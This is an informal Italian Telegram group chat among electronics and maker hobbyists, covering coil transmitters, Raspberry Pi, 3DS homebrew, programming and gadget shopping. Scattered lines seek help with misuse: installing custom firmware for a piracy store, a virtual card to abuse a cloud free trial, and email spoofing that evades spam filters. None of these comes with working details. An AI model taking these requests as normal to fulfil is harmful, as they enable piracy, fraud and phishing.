si ma....non posso dare massa ad entrambe le laterali senza fare corto
Dai la massa a un solo lato
a ok, perfect
L'altro è già a massa internamente
Ok...accendo?
ma così, connettendo sia ingresso che uscita allo stesso pin, non è sbagliato?
Provalo col tester, ma si toccano insieme
Ok, nell' utima foto vedo tutto giusto
connettere sia input che output assieme non provoca di se un problema quindi?
Non hai ingresso e uscita nel condensatore, hai i 2 pin delle 2 armature
Sta esplodendo per stalking
si no ma intendo, ho segnale in ingresso e bobina connessi assieme, poi dall'altra parte ho sia bobina che condensatore a gnd
Agenzie esterne raccoglievano dati personali e li utilizzavano per pubblicità mirate in modo da influenzare la scena politica con propaganda nelle varie elezioni
va bene comunque connettere bobina e segnale assieme al condensatore? ok, perchè pensavo, in condensatore da dove rilascia le cariche? dal punto centrale, dove sta bobina e segnale no? per quello dico
La capacità in parallelo alla bobina ti determina un accordo LC per ottimizzare il rendimento alla frequenza che vuoi trasmettere
ook...eeee sto coso, da quel che capisco posso scegliere la frequenza, come? avvitando e svitando?
Se spammiamo troppo passiamo in privato
beh beh, è un gruppo fatto apposta questo
Si, molto empiricamente
mmhh.... e se io trasmettessi tipo a 1KHz ma impostassi il condensatore per far uscire a una frequenza molto maggiore o minore? cosa succede?🤔
vabb, dopo provo a farlo andare, comunque come lo capisco che sta andando alla stessa frequenza? gli sintonizzo una radio e sento il suono finchè non sembra quello "giusto"?
nessuno che programma su stm32? 
Madonna... è una puntata di Black Mirror che diventa reale
Sembra che questo scandalo Cambridge Analytica e la campagna di 
 che è conseguentemente partita lasceranno il segno, nella stalkerissima piattaforma social
Siamo o non siamo molto facilmente influenzabili.... Dura da ammettere
Hai un rendimento minore
L' Nxp costacaro? Nonvoglio essere compice nel guastarlo
eeee 92 euro + spedizione dall'america ._.
provo ad usare qualcos'altro prima magari
Ehh .....magari è meglio!!!
coomunque...qual'è il voltaggio massimo che gli posso dare in ingresso?
perchè io pensavo a tipo...dargli 15V o qualcosa del genere se capita ora, posso?
Sono acena al ristorante, non posso più seguirti
kk
15 v a un khz senza problemi
No dc per la bobina
oook
Bang supersonico = bomba nucleare, direi che lo siamo troppo
ook, gli ho connesso la mia vittima sacrificale e sembra tutto andare, nel senso, non si è bruciato quindi....perfect, quando mi trovo una radio per ricevere assicurerò il funzionamento, comunque per ora grazie mille
Qualcuno mi potrebbe dare una mano con un programmino di c++?
Spara

Io ho una shotgun
Sciie chimiche
Ti posso mandare in privata il codice?
Pastebin e ok
passa pure a me, ho voglia di codiciare, non voglio studiare il convivio
Tanto per finirla
Te l'ho inviato in privata
sisi sto guardando
per iniziare con linux quale distro sarebbe la migliore ?
Gentoo
Meglio Linux from scratch
È un pelo più facile
ma... ho appena scoperto che le app per nintendo si programmano in c
credevo in java io
Ah WTF
Ma io imparo il C solo per questo
Troppo alto livello Java
io ho una nintendo 3ds xl e volevo fare un programma per controllare il mio robot
sono rimasto triggerato
va installato l'homebrew launcher però...
Se riesci a farci eseguire Python, fammi un fischio
 
Progetto itagliano
A cosa serve?
ma ds
per la 3ds non va
serve sapere il c++
Eroe
Epico
 trovato il tema per un  prossimo video di hacking
Il video è fake o vero?
Cioè si potrebbe fare (almeno credo) ma non credo l'abbiano fatto veramente
Ma come è possibile che quest'uomo si mangi la Nutella così senza nulla
La serata perfetta: vasetto di Nutella pieno, un ottimo rum invecchiato 15 anni e i video di Casey Neistat che ho in arretrato da vedere 
non è nutella
è novi
Nutella della novi
Costa di più
Big money di Youtube
È stato lui a scrivere Nutella
Quando la Ferrero non ti paga abbastanza
credo che a sto punto sia più facile farlo veramente piuttosto che photoshoppare tutto....o anche convincere mezza città a stare al gioco
ahahah
Meglio sul letto con un mi max 2 da 6.5" e video di zeb89
La serata perfetta: vasetto di Nutella pieno, un ottimo rum invecchiato 15 anni e i video di Casey Neistat che ho in arretrato da vedere 
Domanda al volo
Sto acquistando da BangGood (anzi, preordinando), e mi chiede se voglio rimuovere il logo di Banggood dal pacco. Cosa cambio le la checko o no?
mai capito
Toglilo
È la cosa migliore
si l'ho tolto alla fine
Se lasci il logo rischi sempre il furbetto
Fattelo dire da uno che aveva il padre che lavorava all'aeroporto 
E ne ha visti di questi furbetti
 truffa?
Palese
Ennesima piramide
Ehhh io invece che non ho video di Casey in arretrato sono disperato visto che per due settimane si è preso una pausa
Tra l’altro 
 il suo compleanno non è tra tipo 2 giorni? Forse la pausa finisce lì...
Sembra affidabile :/
Si ma dice che con aprile parte abbestia
E spero bene perché ha solo youtube adesso
Dai dai ancora 7 giorni devo resistere
DANIU 25 in 1 Multiuso Cacciavite di Precisione Raccoglitore Set Strumenti di Riparazionehttps://banggood.app.link/do5eWJzXwL consigliate?
Sono diffidente nei confronti di cacciaviti così economici nonostante le recensioni positive
Beta e Usag
Ormai da quando hanno visto il successo di girada sono usciti mille siti perfettamente uguali (tutti con lo stesso schema piramidale). Io sconsiglio fortemente tutti questi siti in quanto aggiudicarsi i prodotti ha lo stesso rischio di vincere o perdere una scommessa.
Qualcuno ha un link per prendere un mi band 2 con sconti o qualcos'altro?
e sapete fra quanto uscirà il mi band 3?
Non credo facciano anche quelli di questo tipo, con le punte piccole tipo per telefoni
Si non credo neanch'io
Meglio cerchi in internet se c'è qualcosa di qualità in giro
con le mani :)
non è la stessa cosa, ed è a pagamento
preassemblato Dell oppure Fujitsu..dovrebbe avere un Pentium 4 sotto..per smontare quel dissipatore dovrebbero esserci delle linguette laterali
niente più Samsung e National Geographic?
per telefonia e orologi: 
   Kit bit per avvitatore invece questi: 1) 
 
)?tag=overvolt-21    3)
io di questi possiedo sia i Makita sia gli iFixit e sono ottimi
a posto, glieli ho trovati io
Buongiorno!
Ubuntu
puppy linux
A meno che non usi una di quelle schedine r4(per DSi intendo)
Per 3ds hombrew
Quanto necessari sono i dissipatori per Raspberry? Si riesce a fare senza o si rischia di danneggiarlo?
Dipende da cosa devi farci girare ma è sempre consigliabile un dissipatore almeno sul processore
Poi ci sono io che non ne ho manco 1 e ci faccio girare i server MC xD
Vabbè ormai non è neanche più pericoloso installarlo
se non lo overclocchi anche senza ce la fai
basta che non stai costantemente al 100% su tutti e 4 i core, che il processore ti arriva a 82 gradi
sto provando ad installare il cfw per installare il freeshop
solo io ho la versione troppo aggiornata e non va la crack?
da quello che ho letto serve una certa versione
la 11.6?
pure tu hai una 3ds?
io ho la 11.4
yup, che è là a prendere polvere
idem
adesso controllo
perchè non ho soldi per i giochi
ma chemmefrega dei giochi, con l'homebrew si può installare Linux 
ho solo 2 giochi originali che ho finito
coooosaa?
sisi
PC portatile
APPUNTO
sai che figata
anche se penso la continuerò ad usare per giocare
è tipo un raspberry
ma una Nintendo quanti GB di RAM ha?
penso che sia sull'ordine dei 512 mb
penso
e come fanno a giocarci tutti i.giochi????
certi dicono 128mb!!!;
ma.... non è possibile
niente, ho la 11.6.0-39E
mhhh... allora non aggiorno
comunque... prova a vedere su yt
ho trovato alcuni video con la 11.6
mmm ok stasera ci do un'occhiata
ok
tu che tutorial stavi seguendo per il cfw
chi si ricorda 

ma l'homebrew Launcher fabda cfw?
sto tizio ha la 11.6
thanks ❤️
comunque vedo che fa cose strane
tipo?
usa magneti...
e una r4i gold
che non ho
ci sono certi che usano il DSi ware
però serve una console già con il cfw
Che figo
da quello che ho letto per la 11.6 servono due console mentre per la 11.4 o con una r4 oppure con un hard modding (saldare)
penso che per il momento la terrò normalmente
Con un programma in Python non arriva al 100% in teoria no?
THIS IS HUGE
beh dipende
se fai uno script che continua a generarti numeri random con vari thread sì che arriva al 100%
e poi si crea un nuovo stato della materia che crea un buco nero che risucchia il tuo raspberry e lo manda indietro nel tempo nel 1492 d.c.
 corrende??
LOL
Ahahhahahha
Lo hai scritto su offerVolt
Combra misuratore du corrende, sulo scinque euriiii
Oggi provo ma mi sa che è andato
Salve sto preparando un drone f450, e sono indeciso con il radiocomando una da 10ch o 6?
 Ciao volevo chiederti riguardo al rpi 3, che forse ne sai più di me, se costruendo un cluster con 4 o 5 rpi è possibile usarli come server? In poche parole devo mettere tanti file di dimensione MB dentro il cluster per poi utilizzarli in un server.
Yee
Ehi, avete visto che dovete fare un altro articolo e siete presi indietrissimo? 
non so più se sperare di avere tempo libero o rinunciarci ._.
Si vecchi state calmi, quella non posso metterla durante l'upload quindi chi apre subito il video appena uscito non la vede perché quando ha aperto non l'avevo ancora messa 
Che figata
La vellutata fondente è terminata!!!
Hahaha col saldatore a destra
Invece il grignolino è un regalo e fa s......o
Oreo?🤔
Nougat
7.0
patch di novembre
Si? 
Figo, magari la metto 🤔🤔
Ti consiglio di caricare il video privato poi di aggiustarlo e metterlo pubblico
Vi ho volute bene sinusoidi, finche è durato
beh dai, fino a 3KHz è perfetto, poi inizia a dare problemi, probabilmente è la cassa
Non quando sono in ritardo 
Ossia sempre
non entriamo nei dettagli
Che font è quello del blog??
Ok... ma non c'è scritto ho guardato fino ad ora;
Ma perché non fate i video una settimana prima?
Questo video l'avevo registrato 4 settimane fa
Avevo ancora i capelli corti, per dire
Eppure...
HAHAHHAHAAHHAAHHAHAHAHAHAAHAHHHA
how to increase productivity 
No io intendevo caricare il video del sabato successivo il sabato prima, essendo sempre una settimana in anticipo sulla pubblicazione dei video
Ciao, sto montando un drone con una naza m lite, a chi posso chiedere per alcuni dubbi?
Che dubbi?
Per quanto ti ha donato come minimo devi renderlo admini e pagargli una cena di lusso
Se il mitico Antonio (solo chi segue le live può capire) vuole aggiungersi mi scriva pure in pvt 
Posso scriverti in privato?
Si
ragazzi... per quanto ne sapete è possibile installare ios su telefono android?
lo so che appena si avvia prendo il 130% delle malattie mondiali ma voglio provarlo
no idea
però forse, adesso che abbiamo iBoot, si potrebbe anche fare
Ciao a tutti ragazzi, c'è un canale dove mi hanno aggiunto (
), è vostro?
Non me l'aspettavo da un gruppo serio come questo..
Mi hanno aggiunto ieri sera e vedevo foto di bambini nudi con il link di questo gruppo, oggi mi appare un errore strano provando ad accedere 
 voglio spiegazioni
Infatti mi avevano parlato bene
Non capisco perchè abbiano un canale di pedofilia
no
Neanche io, ora gli admins ci daranno spiegazioni
E di chi è?
Canale bloccato
appunto
sarà di qualcun'altro
Ah ok, grazie
non si sa, è già stato segnalato a Telegram, che l'ha bloccato
Però ha il nome di questo gruppo..
Non capivo proprio
Don't panic, non c'entriamo nulla
Va bene Filippo, grazie
non ci vuole niente a mettere nell'username MakersITA  per fortuna non si è diffuso
ma cos'è iboot?
sattoh
codice sorgente ufficiale che fa bootare iOS negli iPhone
figooo
State mentendo nascondendo la realtà ma perché ci sono così tanti haters
ero l'unico con il repo ancora pubblico su GItHub, me l'hanno tirato giù l'altro ieri
ma perchè iOS non si bootta in un burrone?
eeh saperlo
saranno quelli di *canale brutto innominabile*
Cioè?
quello che ci ha fatto la shitstorm?
yup
anzi, corro sul voip a vedere se hanno detto qualcosa da ieri sera
passami il Nick in privato
ET telefono casa


comunque chiunque non l'abbia ancora visto si muova ad andare sul canale di electroboom, ha caricato un nuovo video dove sfoga tutto il suo odio verso edison
Già visto
Voglio vincere quel contest 
bravo ù-ù
Boh, anche se non mi serve l'alimentatore è figo
Che Arduino stai usando? 

Sembra un mini pro,però l’integrato saldato sopra mi sembra un po’ grande per essere un At Mega 328p🤔🤔
hahaha, arduino, hahaha
nxp lpc1768, alla modica cifra di 50 euro + spedizione nel sito ufficiale o, se preferisci, 90 + spedizione in qualsiasi altro sito :D
è un caxxo di computer sto coso
Infatti mi sembrava ahahaaa 
Pure io!
Ragazzi per caso qualcuno conosce un modo veloce e free per setuppare un vps con kali linux?
E a che ti servirebbe Kali Linux su un VPS?
Scuss
Ciao, ho scoperto l'esistenza di weechat come funziona?
che p*lle...
Anche io l'ho adocchiato qualche tempo fa alla MediaWorld
alla Coop hanno messo una sala dove ci sono giochi che vanno dalla ps1 o dalla super Nintendo alla ps4 pro e all'xbox1 con la kinect
A fare il loacker
Php
?
.
 ti può dare spiegazioni a riguardo
Su php dici? O sul webinar?
PHP, non troppo caro e vecchio PHP
Ok
Ahahaha questa è bella
Pieno di offerte di schede video, ultimamente... Che i prezzi stiano tornando alla normalità?
Non riesco a formattare una micro sd, dice che è inserito il blocco della scrittura, ma come si disattiva visto che non ha alcun tasto fisico?
Sul adattatore c'è un cursore da spostarr
exatto
No
buttala nella Coca-Cola e vedi come si formatta
Per te la CocaCola è un acido solo perché non la bevi
esatto
Qualcosa di più concreto?
qualcuno sa spiegarmi perché nell'angolo in basso a destra mc output è on ma se levette del radiocomandato non si muove nessun indicatore?
se non ha tasti fisici o roba simile generalmente non puoi
E allora come si è attivato?
tu come l'hai usata?
Ci ho messo sopra retropie
Idem anche a me qualche mese fa...
?
Su quanto PHP faccia schifo
buttala nel camino
Hai risolto in qualche modo?
No ho provato con tutto...per 3 giorni di fila...si è bloccata perché ho clonato male un'altra sd card ...
Qualsiasi modifica appovi ritorna allo stato precedentemente... Nemmeno la formattazione forzata
E non c'è modo di recuperarla?
Ho cercato su internet per un bel po' ma non trovai nulla che funzionasse
Anche io ho fatto qualche ricerca, ed effettivamente niente   riesce a farla funzionare
 scusa se ti disturbo, ma volevo dirti che ho appena impostato ip statico sul rasp, ho provato a seguire il tuo video (usando però una distro Linux su PC e non raspbian su rasp) ma non ha funzionato, ho quindi configurato il rasp con: "sudo nano /etc/network/interfaces".
Ed ho aggiunto: adddress, netmask, gateway, network, broadcast. E decommentando due stringhe. Ti consiglio di aggiungere questo metodo al blog, scusa se ti ho disturbato di sabato sera, ma ho pensato che potesse tornare utile a qualcuno
Sono salito di rank
però occhio che se quell'ip è già occupato il raspi non riesce più a connettersi 
prova a mettere 
quello non dovrebbe essere mai occupato
Buongiorno e buone
giusto, oggi sono le palme
Perfetta la palla da albero di natale e le palme da isola tropicale hahah 
eeh ho visto le palme e ho messo quella 🤫
 altri CSsatori
io credevo fosse erba...
BELLISSIMO AHAHHAHAHAH

 ‎€0‎.8‎1 ‎in‎ve‎ce‎ c‎he‎ €‎2.‎27
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 6‎4.‎25%
⭐️‎ 4‎.8‎4 ‌‎/‌‎ ‎5.‎00‎ (‎11‎4 ‎re‎ce‎ns‎io‎ni)
✂ 
: 

 Store: Gearbest
 

ci sono riuscito..... ho le emoji classiche
su Telegram ci sono sempre state 🤔
si, lo so
io dico quelle di gboard
guarda bene la foto
Che app usa romboli per il cinese? L'ha detto in una live, mi pare, ma non la trovo più.
e come hai fatto? 
Perché non le mette in automatico?
Hellochinese
Come hai fatto?!
Già controllato, con tutti i dispositivi collegati arrivo a .9
Mmmmh, chissà che canale
Ragà quanto rischio la morte da 1 a 10 con una bobina di tesla ?
Nice
Visto visto
Ragazzi, scusate ma ho già Amazon prime e vorrei rinnovarlo prima dell'aumento di prezzo, secondo voi è possibile ? 

Il mio scade a luglio
non credo rischi....dipende da che bobina poi
comunque buongiorno :D
Buongiorno un cazzo mi hanno svegliato le campane della chiesa
ma guardati 2 video di tinelli e ritirati su il morale
Non ho il WiFi rip
Quei video decisamente ti fanno sentire intelligente
mahonna, ho appena fatto tutti i compiti di matematica e non me ne è venuto nemmeno uno, ora guardandomi 2 video già mi sento di nuovo intelligente, garantisco che funzionano
Sei stanco dei tuoi 2 in matematica? Sei triste perché la tua ragazza ti ha mollato per uno meno tordo? Tranquillo, per te ora MomenTinelli Act © capsule molli, come il tuo cervello

che differenza c'è tra il mi band 2 che vendono su gearbest italia e quello chinese version?  Grz
Per intenderci fra questi due:
  Dal portale Italiano
 


 Dal portale internazionale
 

li ho trovati su un canale di offerter
tasse
Nulla
Solo tempo di spedizione
Ma che sono l'unico down che è ancora gn1?
Ma prendi un Amazfit Bip, che con 20 euro in più hai qualcosa di migliore con 3000 funzioni in più
in che senso tasse?
iva e sdoganamento
ma me li aggiunge la dogana iva?
c'è la probabilità
vabbe è rarissimo e con italy express è sicuro che non ci sono
ciao, come faccio a connetermi con putty alla shell di ubuntu su vbox?
Raghi
Dovrei prendere un PC portatile per l uni, ho solo un fisso e per ora ho usato il portatile di mio padre che è un pentium ahhahha.  Con programmi pesanti tipo Matlab è fattibile ma ora che devo usare più di un programma e anche più complesso ho bisogno di qualcos altro. Pensavo al jumper ezbook voi che ne pensate?
Non voglio spenderci molto
Non ne ho capito il senso
I tassi vanno a tasse
Non lo sai?
Putenza
In sostanza, ho bisogno di un PC portatile,  che ne pensate del jumper 3?
Quale scelgo?
Thinkpad
È uguale credo
Vedo subito
Che sito è?
Banggood
Bello ma costa troppo per quello che ci devo fare
Che se vuoi un PC prestante devi spenderci molto...e ora il periodo è sbagliato
1 la dogana può fermarti da 22€ in su
2 non ti fermano quasi mai
Stai dicendo il 100%in più di soldi.
Quale hai guardato?
Qui non paghi la dogana perché è già in europa
Non cambia nulla io ho quello portale italiano un mio amico cinese e sono identici, per 20€ ne vale veramente la pena (non é uno smartwatch, ma per battiti ora passi e sonno) la batteria da un mese é ancora al 30%
Ragà ma la velocità della luce è 10,08 * 10 alla 8 m/s ?
Let me 
 that for you:
 

3 × 108  m/s
Ok quindi una vale l'altra
La NL va benissimo
Io uso sempre quella
Ok
Il primo tra gli annunci Google ahhahah
Eh lo so, ma sono 20 euro in più per avere più schermo, più dettagli, GPS 
 e tante cose in più
Che negozio posso guardare?
guarda su ebay
Okay
t430/x230 a seconda delle dimensioni che vuoi
Bello ma non ho mai preso PC ricondizionati
Ho visto gli altri due, carini :)
io ho il T430
Secondo te gira tranquillamente una macchina virtuale con win7?
Perché mettere una macchina virtuale scusa?
ma conviene che la ventolina del pi butti aria dentro o fuori il case?
dentro
Cose del prof, ci ha fornito una versione di Windows con tutti i programmi che usano in azienda per svolgere le esercitaizoni
dipende dal modello e da quanta ram c'è su
qualcuno di voi è bravo in node-red?
per quel che mi ricordo sì
si ma le aziende devono pagarla importando grossi carichi quindi si traduce in un prezzo piu lato per chi compra direttamente dall'italia
in pratica vorrei filtrare tutta sta roba e leggere solo l'argument
{{msg.payload.argument}}
questa variabile è quello che vuoi leggere
Mi sembrano le Expressions di Angular 🤔
Conviene imparare il c o il c++??
grazie mille
dipende da cosa vuoi fare.
Se vuoi riamere sul basso livello (con la creazione di OS ad esemipio) ti consiglio il C
Ok grazie, ma che differenza c'è tra c e c++?
eh NodeRed è così 
le bestemmie che tiravo
Ah allora figo
di nulla ☺️
sei pazzo
È figo invece
Se è così, sono come le Jinja Templates di Flask
all'inizio sì, è molto figo e comodo, poi appena ti serve qualche variabile particolare partono le bestemmie
scusate ragazzi ma qualcuno ha trovato su internet un file stampabile in 3d per l'antischeda per la porta blindata??
in c non hai classi e costrutti di più alto livello
OK, tu quale mi consigli
??
Dipende da cosa vuoi fare. Probabilmente ti interessa c++
Per quanto ne so io, C++ é un'estensione del linguaggio C, sarebbe un C con aggiunta del paradigma OOP. Quindi se impari C++ dovresti aver imparato anche C
Hanno aggiunto: paradigma di programmazione a oggetti, funzioni virtuali, overloading degli operatori, ereditarietà multipla, template e gestione delle eccezioni
Fonte: Wikipedia (perchè sono ignorante, mica so tutte ste cose e.e)
Non proviene comunque dal Italia gearbest
Per forza, altrimenti non ci metterebbe anni a spedire quella roba
e sicuramente sarebbe già fallito in italia
OK grazie mille a tutti
:D
ha un magazzino in italia quindi quando vi ci importa le tasse le deve pagare per forza
WTF
Quelli di telegram sono proprio dei programmatori
hehehe
Solo dei programmatori scriverebbero cose simili 
appunto 
tipo io nei commit 
 
Ah capito
Raga mi servirebbe una virtual credit card per scroccare 1 anno di EC2. Idee?
io niente, è bello non avere assolutamente nulla da fare per le prossime 10 ore sapendo che dopo essere passate avrò così tanto da fare che tenterò molti altri riti satanici e pur sapendolo non star facendo nulla per attutirlo :D
seguo
non le trovi su internet, sono tutte truffissime
ma come si programma sto coso
mai capito
CATTI
*Faustino50 intensifies*
Grazie
8 è apice
All'ottava
Looool
Se non hai un PC potente puoi sempre usare W4SP se ti serve pippare pacchetti o simulare reti...
cos'è?
cs?
Pub
Gli do un occhiata
Puó mai un drone f450 con motori dji 415kv che pesa 2600gr e batteria 8000mha fare 35 minuti di volo?
google hates us



by 
D:
Dove posso imparare il c?
Su internet
Impiccati google
Io l'ho scoperto perché non ho un computer ho una caffettiera...
Ma penso ci voglia internet, ancora non mi sono informato. A me serve poter lavorare offline
chi sà aiutarmi in nodered?
ecc, in seguito al tuo ricorso di un paio di giorni fa, non ricordo quando, sono ed ero fatto, la chat irc 
 di overvolt ha riaperto sotto indirizzo : 
 e porta : 6669 
Ciao ragazzi
Sto seguendo il video "domotica  finalmente semplice per tutti" purtroppo sono rimasto bloccato a scaricare la versione di python perché ho visto che ci
Sono parecchie versioni 3.5
E non ho trovato il file requirements.txt
Qualcuno può aiutarmi? Grazie
Nessuna idea??
Qualcuno ha qualche sito per creare delle app bluetooth? Ho provato App Inventor ma la grafica esce sfalsata
Oppure se sapete come rimediare
Utilizza Kivy se sai programmare in Python
beh intanto se vuoi usare app inventor usa delle posizioni decenti....tipo il rapporto tra la larghezza e 8 che te lo mette a sinistra ad un ottavo di larghezza, voglio dire, 
Help
Esce brutta
Ieri ho iniziato ad usarla, non so tutto
Illustrami
Non troppo
Allora utilizza DroidScript se sai il Javascript
Ma devi pagare per creare l'APK
Allora no
Mi serve una cosa solo "a scopo illustrativo"
Deve essere semplice da fare, tanto non mi interessa molto l'interfaccia
Ragazzi non riesco più a connettermi al rasp via ssh
Con l'ip fisso
Help!
Ad esempio, questa andrebbe anche bene ma il fatto che escano a caso no
non che io sia poi così tanto studiato...ma basta dire tipo width/8 e te lo mette li, oppure heigth/16 e te lo mette in quell'altro punto, vedi te insomma, cerca su internet, ne trovi di roba a riguardo
guarda dal modem che IP ha preso
Eh sì ma nell'app è così
Non devi pagare per l'apk
Non far conto alle cose che ho spostato sotto, era per provare
Però poi esce storta :/
Bisogna saper programmare?
No
Decisamente no
Ma proprio 0
Non mi sembri tanto convinto 
Infatti sono sicuro solo al 99.9999999%
So solo c++, php e un po' di python...
Che poi oddio almeno capire come funziona un event listener ma insomma è proprio il minimo quello
Complicato 
Con appinventor ti basta una laurea in agronomia, tranquillo
Però mi combina casini
Normale, l'app per android col mio telefono ogni tanto mi crashava a minchia
Mining Farm su Italia 1
Ma il prolema é che mi sposta i pulsanti dove vuole lui
Nell'anteprima esce bene e poi si sminchia
Guarda sui valori di heigth e width a destra
Sono giusti
Anteprima
Welcome to appinventor
Risultato finale xD
Dipende anche dalla versione di android, tutto quello che devi fare adesso è smonare finché qualcosa non si sistema
Madu, pensavo fosse un app tanto semplice...
È semplicissima
Si ma è tipo Pollon
Combina guai
È solo sviluppata talmente di merda che in confronto internet explorer è bello
Già
Voglio l'Oscar
Io un app funzionante 
ma ma ma, internet explorer è bello...almeno, da xp in poi non è più completamente fuori uso
è solo stato stuprato dalle meme e non si è mai ripreso
non questi feelss però
 beh, non credo che studierò più che tanto chimica, mi basta un 
 , ora sono troppo occupato a guardare un video fantastico di the coding train uscito per commemorare il pi day
si, proprio lui, quello che fa tutto in 
 
AMMMOREEEE
No, anche in processing
si intendevo dire javascript di processing
js5 o come si chiama
No, p5.js != Processing Runtime
a, proprio processing processing fa lui? beh ho sempre guardato quelli su js web e p5.js quindi non lo sapevo
no ma sto qua ha seriamente usato dei punti su un piano casuali che cadono randomicamente in 2 aree e per definire pi ha posto "punti randomici caduti nell'area del cerchio inscritto nel quadrato/quelli caduti nell'area del quadrato(ossia tutti)" per approssimare, facendo andare avanti questa cosa per ogni decimale che approssima....E' UN FOTTUTO GENIO
E' un algoritmo conosciuto da tempo
si ok ma è brutale, ogni decimale che calcola è sempre più lento
: 
compra un buon libro
Io intendevo un PDF o un sito


Cosa desidera?...
Anche in questo gruppo?
Ma tu non eri bannato?
Ma ciao enomis
Hahahaha 
 odiano gli admin 
E chi lo dice?...
è un voip infatti
Come fai a essere sicuro?
Ricordo chiaramente questo nome
hey, io non sono assolutamente in alcun tipo di gerarchia amministrativa in questo gruppo
MAH
beh nel dubbio tutti amano i tecnici della scuola
Ti farò cacciare da Palinuro e insultare da F
CATTI
Noooio
...
Faustino è poco aggressivo
Cosa ci fa qui lei, tra tutta questa gentaglia?
Ma cosa...??...
Infatti ci sei anche te 
Lol
forse fatto che hai VoIP nel nome? 
Il libro/bibbia per il c è il k&r, è praticamente la trascrizione diretta della parola di dio
OK grazie mille :D
VoIP = voglio odiare i poveriadmindim......
Come lei
aah, si spiega tutto
Proprio senza vergogna insomma
Poveri porci
ah quindi io sarei un porco? 
Il correttore aveva corretto
Leggi ora...
mm
Scrivimi in pvt...
Abbiamo dei conti in sospeso...
vorrei evitare di essere segnalato thanks
Ahahahahahah
In che senso 
Studia ragioneria e stava calcolando il reddito annuo di filippo, ovvio no?
Non segnalo
Ceh mi sembra proprio una cosa abbastanza intuitiva
Non sono quel genere di persona
Nel senso che sa lui...
Vai in una chat segreta
Bravo
Apri una chat segreta
Visto che così non si può fare...
Ahahahah
Sei da bannare
No
Tutti tranne il mio Gioele
Qualcuno che sa cosa fare... Confronto a mister T...
I feels
 contattami in privato da parte di 
 "l'innocente"
"parlane sul gruppo, non in privato"
No
muri 
Subitoooo
Cosa vuoi?
Noi aspettiamo
Facciamo noi i giudici
Rompere le balle
Lascia stare
Continua a bere il rum invecchiato 
...
Dillo sul gruppo no?
Vorrei essere sbannato

Marco vero che me lo fai assaggiare la prossima volta che vengo a registrare web?
diventa la paga per i video
sperando che non sia retroattiva
Visto che mister T non va a genio che sto su ignu...
E allora?
Ahahahahahah
Lo è lo è

Ma vuoi sfruttare romboli per il suo rum? No, perché a me sembra una buona idea 
Anzi...
Uno scambio equilibrato
La smetti di taggarlo?
No
Chi è stato?
Io
Ahahahahahahah
Romboli esce alla cazzo e banna 
non sottovalutare app inventor, se sai usare bene il programma puoi creare ottime applicazioni con grafiche eccezionali
Peccato però
Ah, pensavo fosse stata la mano
mi piace 
Non funge con me, si sballa tutto
Non vedo impostazioni dove poter cambiare qualcosa però
Mi piase 10
BrunoIt purtroppo non ha ancora implementato l'algoritmo di Machine Learning nei GroupHelp per bannare laggente cattiva...
guarda qualche tutorial su YouTube
Ne ho seguito uno per farla
nooo, lo volevo dire ioo
e niente, ora faccio cose in 3d con p5.js :D
ho cambiato idea, non voglio autolesionarmi

good job
 quello della mano è un buon...
Per chi non avesse capito la battuta di prima
io l'ho visto
shh.....
HAHAHAAHAHAHAHAHAHAAHA
perfetto ù-ù
Diesi
Tu si che capisci
Ehi 
 che ne dici di fare uno o due video in cui costruisci volante e pedaliera (e cambio, eventualmente) per PC con Arduino o con altri aggeggi che tu sai usare?
NO
non posso dirlo che altrimenti warn
Deve iniziare la serie "benvenuto in Linux"
Lui 
Meglio evitare
Lol
Potresti farlo tu
Bah, già web è abbastanza
Piuttosto mi apro un canale tutto mio 
Non sarebbe male 

Un canale con cui fai conocrrenza a Marco 
E ci guadagni

Ecco
What a pretty curious point
Uuuuu
overCicca
ciccaVolt
Visto che belle idee?
Te devi fare cyber security
Muoviti
Che ti aspettiamo

E non sarebbe nemmeno tanto difficile 🤔
NO
Io voglio cyber security e Linux
io ho fatto un controller MIDI per FL Studio con Arduino hahahha
Attivati, compra più rum con cui pagare la tua gang e muoviti a sfornare questi video 
"pagare"
Ricompensare?
"ricompensare"
TU?????
PASSAMI L'INO
Oh non ti accontenti mai 
HEEEEEHEHEHE
 stavi leggendo i messaggi dei terrapiattisti l'altro giorno
devo rovistare tra i 8452 progetti
Non c'è scritto cosa ci guadagni però
??
🤷‍♂
Non sapevo se dispiacermi o uccidermi, credimi
No cosa spe
Ma dov'è il grupppooo
Oh, a me piace quella e mi piacerebbe studiarla
È open
Uno diceva che la morte è una trovata dei governi
Un complotto
Uh
Yes but you pointed out a pretty curious point before
Come cazzo fai ad essere admin in quel gruppo?

Però mi è dispiaciuto per arco
Voglio un sacco di bene ad arcov
È sviluppatore della teoria ciccariana
Spiegati meglio....
Beh gli voglio bene
Non c'è molto da spiegare
Ma per le sue idee?
🤷‍♂
Cosa ti piace di lui?
si...si...si....è da tipo tutta la giornata che è esploso ho visto
I conGUntivi
Mi fai preoccupare
Io basito
Devi comunque avere il nome
Boh se vuoi ci sta
Infatti sono dentro
Ma davvero stavi perdendo il treno per l'ora legale?🧐
Quasi

Raga ma posso pubblicizzare la mia musica su questo gruppo o mi Bannate? 
No pensavo trollassi
Il cell e il mi band mi si sono rimessi da sali, il mio orologio citizen si è rimesso da solo, il pc da solo.... L'unica cosa che non si è rimessa da sola è la mia RADIOsveglia, che ovviamente ha suonato tardi ahah
Eh il miband è scarico
L'orologio no non si aggiusta
Cicca ma quindi?
Posso 
Chiedi al boss
Il mio è radiocontrollato.... Ma anche la sveglia in teoria, si è rimessa a mezzogiorno la furba
Ma a Romboli già gli rompo abbastanza 
Vabbè và, se gli scrivo in privato si altera? (da notare il termine ricercato 'alterare')
Qualche smanettone sa come fare email spoofing evitando che le email vadano nello spam?
Yup
Allora lo taggo qua sul gruppo
 mi hanno detto di chiedere a te 
Ma perchè sconsigliano di saldare gli integrati direttamente sulle millefori senza usare i supporti?
Perché ad alta temp li danneggi
Giusto
E hanno un nome specifico i supporti? Per trovarli su internet 
🦓
Zoccoli
Grazie
e niente, ora che l'ho fatto mi sento cristo
tuuutto in p5.js....tanta roba
🤣
CATTI
best rebus ever
giusto 
ho rimpicciolito l'immagine di non so quanto...ma tipo esponenzialmente
perchè in realtà tutti quei pixel hanno solo 3 colori :D
Io sono scarsissimo a risolverli ahhaha
nella seconda immagine solo tutti formati da 3 colori, R, G o B niente da 0 a 255, O 0 O 255 :DDD
Ahah io non avrei indovinato
e mi sento male a pensarci perchè non riesco a concepirlo con la mia mente
Mai nella vita...e i motori non vanno bene... la batteria è sproporzionata...e pesa troppo
Qualcuno ha mai usato questo tipo di alimentatore?
N
Sembra quello dell' anet a8
